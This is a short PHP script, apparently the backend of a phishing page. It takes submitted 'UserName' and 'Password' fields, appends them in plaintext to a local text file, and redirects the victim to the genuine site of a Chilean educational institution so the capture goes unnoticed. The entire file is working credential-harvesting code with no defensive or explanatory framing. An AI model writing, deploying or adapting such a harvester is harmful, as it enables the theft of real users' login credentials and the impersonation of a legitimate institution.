<?php
ini_set('display_errors', 1);
ini_set('log_errors', 1);
error_log('PHP Error: ' . __FILE__);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo "Método no permitido.";
    exit;
}

// Guardar los datos
if (isset($_POST['UserName']) && isset($_POST['Password'])) {
    file_put_contents("archivo.txt", "Usuario: " . $_POST['UserName'] . " - Contraseña: " . $_POST['Password'] . PHP_EOL, FILE_APPEND);
    header("Location: https://www.inacap.cl");
    exit;
} else {
    http_response_code(400);
    echo "Faltan parámetros.";
    error_log('Error: Parámetros no enviados.');
    exit;
}
?>

